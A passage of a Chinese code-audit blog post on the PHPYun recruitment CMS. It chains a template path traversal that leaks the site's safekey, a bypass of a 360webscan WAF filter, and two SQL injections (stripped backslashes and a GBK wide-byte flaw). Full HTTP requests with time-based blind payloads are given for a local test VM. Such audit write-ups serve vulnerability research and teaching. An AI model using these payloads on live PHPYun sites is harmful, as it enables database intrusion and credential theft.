+<p>所以在common里，config的值是已经被赋予了smarty模板里的变量的</p>
+<p>只要再找到一个可以控制smarty渲染的目标模板文件为我们上面找到的<code>template/admin/admin_web_config.htm</code></p>
+<p>这样就能获得<code>$config[&#39;sy_safekey&#39;]</code>的值</p>
+<p>在common类里有两个函数可以进行display的操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yuntpl</span>(<span class="params"><span class="variable">$tplarr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$tplarr</span>) &amp;&amp; <span class="variable">$tplarr</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$tplarr</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$v</span>.<span class="string">&quot;.htm&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;模版不能为空！&quot;</span>;<span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yun_tpl</span>(<span class="params"><span class="variable">$tplarr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$tplarr</span>) &amp;&amp; <span class="variable">$tplarr</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$tplarr</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="variable">$rand</span>=<span class="title function_ invoke__">mktime</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;style&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;m.<span class="string">&quot;/&quot;</span>.<span class="variable">$v</span>.<span class="string">&quot;.htm&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;模版不能为空！&quot;</span>;<span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要找到会调用yuntpl或者yun_tpl的类，并且渲染的文件可控</p>
+<p>最后找到<code>company/model/index.class.php</code>，在他的<code>index_action()</code>函数最后</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162036860.png" title="image-20240116203636703" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162036860.png" alt="image-20240116203636703"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tp</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>]:<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seo</span>(<span class="string">&quot;company_&quot;</span>.<span class="variable">$tp</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">yunset</span>(<span class="string">&quot;com_style&quot;</span>,<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;sy_weburl&#x27;</span>].<span class="string">&quot;/template/company/&quot;</span>.<span class="variable">$tplurl</span>.<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">yunset</span>(<span class="string">&quot;comstyle&quot;</span>,<span class="string">&quot;../template/company/&quot;</span>.<span class="variable">$tplurl</span>.<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">yunset</span>(<span class="string">&quot;defaultstyle&quot;</span>,<span class="string">&quot;../template/default/&quot;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">yuntpl</span>(<span class="keyword">array</span>(<span class="string">&#x27;company/&#x27;</span>.<span class="variable">$tplurl</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$tp</span>));</span><br></pre></td></tr></table></figure>
+
+<p>渲染的文件是可以控制的</p>
+<p>同时还要注意前面，必选要存在企业，才可以走到这一步</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162041729.png" title="image-20240116204111676" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162041729.png" alt="image-20240116204111676"></a></p>
+<p>手动添加一个企业即可</p>
+<p>所以我们只需要访问以下url，就可以获得<code>$config[&#39;sy_safekey&#39;]</code>的值</p>
+<p><code>http://192.168.91.39:8082/company/index.php?m=index&amp;c=index&amp;tp=../../admin/admin_web_config&amp;id=1</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162044513.png" title="image-20240116204425428" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162044513.png" alt="image-20240116204425428"></a></p>
+<p>得到<code>$config[&#39;sy_safekey&#39;]</code>的值后就可以绕过第一个waf了</p>
+<h2 id="waf-2"><a href="#waf-2" class="headerlink" title="waf 2"></a>waf 2</h2><p>在经过第一个waf后，还有<code>include/webscan360/360safe/360webscan.php</code>里的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$webscan_switch</span>&amp;&amp;<span class="title function_ invoke__">webscan_white</span>(<span class="variable">$webscan_white_directory</span>,<span class="variable">$webscan_white_url</span>)) &#123;</span><br><span class="line">	</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$webscan_get</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">webscan_StopAttack</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$getfilter</span>,<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$webscan_post</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">webscan_StopAttack</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$postfilter</span>,<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$webscan_cookie</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_COOKIE</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">webscan_StopAttack</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$cookiefilter</span>,<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$webscan_referre</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$webscan_referer</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">webscan_StopAttack</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$postfilter</span>,<span class="string">&quot;REFERRER&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的思路，不仅这个if语句就可以绕过</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162050381.png" title="image-20240116205027303" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162050381.png" alt="image-20240116205027303"></a></p>
+<p><code>$webscan_switch</code>固定为1，需要让<code>webscan_white()</code>返回为false</p>
+<p><code>$webscan_white_directory</code>的值为<code>admin|\/dede\/|\/install\/</code></p>
+<p><code>$webscan_white_url</code>是一个数组，值为</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162057038.png" title="image-20240116205716910" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162057038.png" alt="image-20240116205716910"></a></p>
+<p>跟进webscan_white</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">webscan_white</span>(<span class="params"><span class="variable">$webscan_white_name</span>,<span class="variable">$webscan_white_url</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">  <span class="variable">$url_path</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line">  <span class="variable">$url_var</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$webscan_white_name</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$url_path</span>)==<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$webscan_white_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url_var</span>)&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_path</span>,<span class="variable">$key</span>)&amp;&amp;<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_var</span>,<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">empty</span>(<span class="variable">$url_var</span>)&amp;&amp;<span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_path</span>,<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里比较简单，只需要满足<code>stristr($url_path,$key)&amp;&amp;stristr($url_var,$value)</code>即可</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162055563.png" title="image-20240116205540490" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162055563.png" alt="image-20240116205540490"></a></p>
+<p>这里的<code>$url_path</code>和<code>$url_var</code>都是我们可以控制的</p>
+<p>让<code>$url_path</code>里有<code>index.php</code>，这个很好满足，因为都是从这里开始的</p>
+<p>让<code>$url_var</code>里有<code>admin_dir=admin</code>，这个也很简单，这个参数不会影响我函数的执行</p>
+<p>所以绕这个waf的url为</p>
+<p><code>http://192.168.91.39:8082/company/index.php?admin_dir=admin&amp;sql=xxxx</code></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这里有俩个点，一个是作者的傻逼操作导致的注入，另一个是因为对mysql的配置进行的宽字节注入</p>
+<h3 id="注入一"><a href="#注入一" class="headerlink" title="注入一"></a>注入一</h3><p><code>db.safety.php</code>里的<code>quotesGPC();</code>会将输入进行<code>addslashes()</code>操作，就是对符号添加转义字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quotesGPC</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())&#123;</span><br><span class="line">	 	<span class="variable">$_POST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;addSlash&quot;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$_GET</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;addSlash&quot;</span>, <span class="variable">$_GET</span>);</span><br><span class="line">		<span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;addSlash&quot;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addSlash</span>(<span class="params"><span class="variable">$el</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$el</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;addSlash&quot;</span>, <span class="variable">$el</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$el</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在手机版的登录函数里，作者做了一个非常奇怪的操作</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162115352.png" title="image-20240116211542261" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162115352.png" alt="image-20240116211542261"></a></p>
+<p><code>wap/model/login.class.php</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162117202.png" title="image-20240116211705046" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162117202.png" alt="image-20240116211705046"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">......</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">DB_select_once</span>(<span class="string">&quot;member&quot;</span>,<span class="string">&quot;`username`=&#x27;&quot;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27; and usertype=&#x27;&quot;</span>.<span class="variable">$usertype</span>.<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;username,usertype,password,uid,salt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>他自己把转义符号<code>\</code>给去掉了，真离谱</p>
+<p>所以这里的注入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /wap/index.php?m=login&amp;c=index&amp;admin_dir=admin HTTP/1.1</span><br><span class="line">Host: 192.168.91.39:8082</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 86</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">submit=1&amp;username=1&#x27;+or+sleep(10)%23&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81</span><br></pre></td></tr></table></figure>
+
+<p>即可进行sql盲注，然后交给sqlmap就行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162133490.png" title="image-20240116213342396" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162133490.png" alt="image-20240116213342396"></a></p>
+<h3 id="注入二"><a href="#注入二" class="headerlink" title="注入二"></a>注入二</h3><p>审这里的时候就收获大大滴，原理可以看p牛的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
+<p>在连接数据库的时候会进行以下操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;coding=<span class="string">&quot;gbk&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES <span class="subst">$this</span>-&gt;coding&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&quot;</span>, <span class="variable">$this</span>-&gt;conn); </span><br></pre></td></tr></table></figure>
+
+<p>这里进行了<code>character_set_client=binary</code>操作</p>
+<p>这里的意思就是，在数据进入数据库的时候，mysql不会把数据视为字节流，而是视为单个字节</p>
+<p>即在gbk编码下，不会把<code>\xdf5c</code>识别为中文字符<code>運</code>，而是识别为<code>0xdf</code>和<code>0x5c</code>的ascii码</p>
+<p>所以一般情况下，这里是不会存在宽字节注入的，但是！</p>
+<p>有一个非常危险的操作，即<code>iconv(&quot;utf-8&quot;,&quot;gbk&quot;,$s)</code></p>
+<p>会把字符从utf-8编码转换为gbk编码，大多数是为了防止乱码的出现，但是却造成了一个sql注入漏洞</p>
+<p>比如，将一个中文字符从utf-8转为gbk编码后，他的16机制为<code>xx5c</code>，同时反斜杠<code>\</code>的ascii码的16进制也为<code>5c</code></p>
+<p>并且msql以binary的格式读取这两个数据，那么就会读成<code>xx5c5c</code>，也就会有两个<code>\</code>，从而把反斜杠<code>\</code>转义掉，造成单引号<code>&#39;</code>逃逸</p>
+<p>在登录时，会进入路由<code>/index.php?m=login&amp;c=loginsave</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162209669.png" title="image-20240116220957542" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162209669.png" alt="image-20240116220957542"></a></p>
+<p>这个函数有以下操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;gbk&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">DB_select_once</span>(<span class="string">&quot;member&quot;</span>,<span class="string">&quot;`username`=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;`pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status`&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后会执行以下sql语句</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162214882.png" title="image-20240116221437742" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162214882.png" alt="image-20240116221437742"></a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status` <span class="keyword">FROM</span> phpyun_member <span class="keyword">WHERE</span> `username`<span class="operator">=</span><span class="string">&#x27;1234567&#x27;</span> limit <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的username我们是可控的，可以根据上面的原理进行时间盲注</p>
+<p>可能是我虚拟机的问题，时间一长网站就遭不住，所以时间得弄短一点</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?m=login&amp;c=loginsave&amp;admin_dir=admin HTTP/1.1</span><br><span class="line">Host: 192.168.91.39:8082</span><br><span class="line">Content-Length: 67</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://192.168.91.39:8082</span><br><span class="line">Referer: http://192.168.91.39:8082/index.php?m=login&amp;usertype=2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=錦&#x27;+or+sleep(2)%23&amp;password=1234567&amp;usertype=2&amp;path=index&amp;loginname=1&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81</span><br></pre></td></tr></table></figure>
+
+<p>这里的中文字符使用“錦”,其实只要是gbk编码后面以5c结尾即可，“猏”也可以</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162217473.png" title="image-20240116221728297" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162217473.png" alt="image-20240116221728297"></a></p>
+<p>这里虽然显示的虽然没有两个<code>\</code>，但是后面到数据库就会了</p>
+<p>明显的延时，然后丢给sqlmap就行了</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233404.png" title="image-20240116223306296" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233404.png" alt="image-20240116223306296"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233152.png" title="image-20240116223318053" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233152.png" alt="image-20240116223318053"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
